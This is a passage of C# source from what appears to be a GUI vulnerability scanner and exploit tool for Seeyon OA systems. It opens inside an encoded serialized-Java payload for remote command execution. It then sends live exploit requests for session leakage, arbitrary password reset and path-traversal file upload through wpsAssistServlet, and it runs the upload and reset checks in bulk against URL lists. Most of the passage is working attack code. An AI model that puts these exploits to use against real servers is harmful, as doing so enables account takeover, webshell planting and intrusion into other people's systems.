FeTJBRTFOSzdZQVFFd0JUZ0U2QkN3U1RyWUFFWmtBUUNzU1Q3WUFFWmtBSUNzU1VMWUFFWm9BRjdzQVVWbTNBRklydGdCVEVsUzJBRk8yQUZWTUJyMEFLVmtERWloVFdRUVNWbE5aQlN0VE9nU25BRDByRWsrMkFCR1pBQ0FyRWxDMkFCR2FBQmU3QUZGWnR3QlNLN1lBVXhKWHRnQlR0Z0JWVEFhOUFDbFpBeEpZVTFrRUVsbFRXUVVyVXpvRXVBQmFHUVMyQUZ0T3V3QmNXUzIyQUYyM0FGNFNYN1lBWURvRkdRVzJBR0daQUFzWkJiWUFZcWNBQlJJOU9nYTdBRnhaTGJZQVk3Y0FYaEpmdGdCZ09nVzdBRkZadHdCU0dRYTJBRk1aQmJZQVlaa0FDeGtGdGdCaXB3QUZFajIyQUZPMkFGVTZCaGtHT2djdHhnQUhMYllBWkJrSHNEb0ZHUVcyQUdVNkJpM0dBQWN0dGdCa0dRYXdPZ2d0eGdBSExiWUFaQmtJdndBRUFKTUEvZ0VKQURnQWt3RCtBUjBBQUFFSkFSSUJIUUFBQVIwQkh3RWRBQUFBQVFDR0FBQUFiZ0FiQUFBQWN3QUpBSFFBRGdCMUFCQUFkZ0FUQUhjQUhBQjRBQzRBZVFCQ0FIc0FXUUI5QUdzQWZnQi9BSUFBa3dDREFKd0FoQUN1QUlVQXdnQ0dBTlFBaHdENkFJZ0EvZ0NNQVFJQWpRRUdBSWdCQ1FDSkFRc0FpZ0VTQUl3QkZnQ05BUm9BaWdFZEFJd0JJd0NOQUFFQWpRQ09BQUVBaFFBQUFZTUFCQUFNQUFBQTh4Skx1QUJNdGdCTkVrNjJBQkdhQUJDN0FDbFpFbWEzQUdkT3B3QU51d0FwV1JKb3R3Qm5UcmdBV2kyMkFHazZCTHNBYWxrckxMWUFhN2NBYkRvRkdRUzJBRjA2QmhrRXRnQmpPZ2NaQmJZQWJUb0lHUVMyQUc0NkNSa0Z0Z0J2T2dvWkJiWUFjSm9BWUJrR3RnQnhuZ0FRR1FvWkJyWUFjcllBYzZmLzdoa0h0Z0J4bmdBUUdRb1pCN1lBY3JZQWM2Zi83aGtJdGdCeG5nQVFHUWtaQ0xZQWNyWUFjNmYvN2hrS3RnQjBHUW0yQUhRVUFIVzRBSGNaQkxZQWVGZW5BQWc2QzZmL25oa0V0Z0JrR1FXMkFIbW5BQ0JPdXdCUldiY0FVaEo2dGdCVExiWUFlN1lBVXhKOHRnQlR0Z0JWc0JKOXNBQUNBTGdBdmdEQkFEZ0FBQURRQU5NQU9BQUJBSVlBQUFCdUFCc0FBQUNiQUJBQW5BQWRBSjRBSndDZ0FEQUFvUUErQUtJQVV3Q2pBR0VBcEFCcEFLVUFjUUNtQUg0QXFBQ0dBS2tBa3dDckFKc0FyQUNvQUs0QXJRQ3ZBTElBc0FDNEFMSUF2Z0N6QU1FQXRBRERBTFVBeGdDM0FNc0F1QURRQUxzQTB3QzVBTlFBdWdEd0FMd0FDQUNQQUlrQUFnQ0ZBQUFBTWdBREFBSUFBQUFTS3JnQUFiQk11d0FEV1N1MkFBUzNBQVcvQUFFQUFBQUVBQVVBQWdBQkFJWUFBQUFHQUFFQUFBQTNBSUVBQUFBQUFBRUFrQUFBQUFJQWtRPT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=)}}";
                StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                                                                             // ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                                                                             //  byte[] byte1 = encoding.GetBytes(postid);
                                                                             //   req.ContentLength = byte1.Length;
                                                                             //  ss.Write(postid);
                                                                             //  ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);
                HttpStatusCode statusCode = response.StatusCode;
                string sss = streamreader.ReadToEnd();
                if (statusCode == HttpStatusCode.InternalServerError)
                {
                    richTextBox7.AppendText("[!]可能存在致远M1-server远程命令执行漏洞" + Environment.NewLine);
                }
                else
                {
                    richTextBox7.AppendText("不存在致远M1-server远程命令执行漏洞" + Environment.NewLine);
                }
            }

            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远M1-server远程命令执行漏洞" + Environment.NewLine);
            }

        }

        public void df5()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll";
                HttpClientHandler handler = new HttpClientHandler();
                handler.AllowAutoRedirect = false;
                using (var httpclient = new HttpClient(handler))
                {
                    var ss = new HttpRequestMessage(HttpMethod.Get, url);
                    var sss = httpclient.SendAsync(ss).Result;
                    if (sss.StatusCode == HttpStatusCode.OK)
                    {
                        //  String ssss = sss.Content.ReadAsStringAsync().Result;
                        richTextBox7.AppendText("存在致远U8 getSessionList.jsp Session泄漏漏洞" + Environment.NewLine);
                    }
                    else if (sss.StatusCode == HttpStatusCode.Found)
                    {

                        richTextBox7.AppendText("不存在致远U8 getSessionList.jsp Session泄漏漏洞" + Environment.NewLine);
                    }
                }

            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远U8 getSessionList.jsp Session泄漏漏洞" + Environment.NewLine);


            }

        }

        public void df6()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/seeyon/rest/phoneLogin/phoneCode/resetPassword";
                HttpClientHandler handler = new HttpClientHandler();
                handler.AllowAutoRedirect = false;
                using (var httpclient = new HttpClient(handler))
                {
                    var ss = new HttpRequestMessage(HttpMethod.Get, url);
                    var sss = httpclient.SendAsync(ss).Result;
                    if (sss.StatusCode == HttpStatusCode.OK)
                    {
                        //  String ssss = sss.Content.ReadAsStringAsync().Result;
                        richTextBox7.AppendText("[!]存在致远OA任意密码重置漏洞(QVD-2023-21704)" + Environment.NewLine);
                    }
                    else
                    {

                        richTextBox7.AppendText("不存在致远OA任意密码重置漏洞" + Environment.NewLine);
                    }
                }
            }
            catch (Exception ex)
            {

                richTextBox7.AppendText("不存在致远OA任意密码重置漏洞" + Environment.NewLine);

            }

        }

        public void df7()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/seeyon/rest/orgMember/-4401606663639775639/password/share.do";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "PUT"; //POST请求
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                //   req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                // req.ContentType = "text/json";
                //    req.Headers.Add("cmd", textBox17.Text);
                String postid = "";
                StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(postid);
                req.ContentLength = byte1.Length;
                ss.Write(postid);
                ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                string s = streamreader.ReadToEnd();

                if (s.Contains("SUCCESS"))
                {
                    richTextBox7.AppendText("[!]存在致远OA ucpcLogin密码重置漏洞" + Environment.NewLine);
                }
                else
                {
                    richTextBox7.AppendText("不存在致远OA ucpcLogin密码重置漏洞" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA ucpcLogin密码重置漏洞" + Environment.NewLine);
            }

        }

        private void button15_Click_1(object sender, EventArgs e)
        {
            if (textBox15.Text == "")
            {
                MessageBox.Show("请输入信息");
            }
            else
            {
                richTextBox7.Text = "正在开始一键检测....." + Environment.NewLine;
                // richTextBox7.AppendText("模块装载完毕" + Environment.NewLine);
                bbb();
                // ccc();
                aaa1();
                ddd();
                fff();
                aaa();
                df();
                df1();
                df5();
                // df3();
                df6();
                df7();

                session();
            }
            try
            {
                string url = textBox15.Text + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test1.jsp&fileId=2";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果

                JObject jobj = JObject.Parse(s);
                textBox3.Text = jobj["code"].ToString();
                if (textBox3.Text == "1000")
                {
                    richTextBox7.AppendText("[!]存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                }
                else
                {
                    richTextBox7.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
            }
            richTextBox7.AppendText("检测流程结束!" + Environment.NewLine);
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }


        public void df10()
        {
            richTextBox7.AppendText("开始批量扫描:致远OA ucpcLogin漏洞" + Environment.NewLine);
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "SeeyonwpsAssistServlet.txt";
            string[] urls = File.ReadAllLines(dictionaryPath);

            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {
                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    try
                    {
                        ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                        String urlss = urla + "/seeyon/rest/orgMember/-4401606663639775639/password/share.do";
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);


                        //     String url = textBox15.Text + "/seeyon/rest/orgMember/-4401606663639775639/password/share.do";
                        //    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                        request.Method = "PUT"; //POST请求
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        //   req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                        // req.ContentType = "text/json";
                        //    req.Headers.Add("cmd", textBox17.Text);
                        String postid = "";
                        StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                        ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                        byte[] byte1 = encoding.GetBytes(postid);
                        request.ContentLength = byte1.Length;
                        ss.Write(postid);
                        ss.Flush();
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                        Stream getStream = response.GetResponseStream();
                        StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                        string s = streamreader.ReadToEnd();

                        if (s.Contains("SUCCESS"))
                        {
                            richTextBox7.AppendText(urla + "[!]存在致远OA ucpcLogin密码重置漏洞" + Environment.NewLine);
                        }
                        else { }
                    }
                    catch (Exception ex)
                    {
                        richTextBox7.AppendText("网络异常" + Environment.NewLine);
                    }

                });


            }
        }
        private void button18_Click_1(object sender, EventArgs e)
        {
            if (textBox15.Text == "")
            {
                MessageBox.Show("请输入信息");

            }

            richTextBox7.AppendText("\n" + "正在开始批量检查..." + Environment.NewLine);
            richTextBox7.AppendText("--------------------检测模块装载中---------------------" + Environment.NewLine);
            richTextBox7.AppendText("开始批量扫描:wpsAssistServlet上传漏洞" + Environment.NewLine);
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "SeeyonwpsAssistServlet.txt";
            string[] urls = File.ReadAllLines(dictionaryPath);

            {
                Task[] tasks = new Task[urls.Length];
                for (int i = 0; i < urls.Length; i++)
                {
                    String urla = urls[i];
                    tasks[i] = Task.Run(() =>
                    {
                        try
                        {
                            String urlss = urla + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test1.jsp&fileId=2";
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                            request.Method = "GET";
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                            request.Accept = "*/*";
                            //   request.ContentType = "application/json";
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                            Stream stream = response.GetResponseStream(); //接收请求
                            StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                            string s = reader.ReadToEnd();  //字符串S读取接收结果
                            JObject jobj = JObject.Parse(s);

                            textBox3.Text = jobj["code"].ToString();
                            df10();
                            if (textBox3.Text == "1000")
                            {
                                richTextBox7.AppendText(urla + "[!]存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                            }
                            else
                            {
                                richTextBox7.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                            }
                        }
                        catch (Exception ex)
                        {
                            //richTextBox16.AppendText("网络异常" + Environment.NewLine);
                        }

                    });


                }
            }
        }
    }
}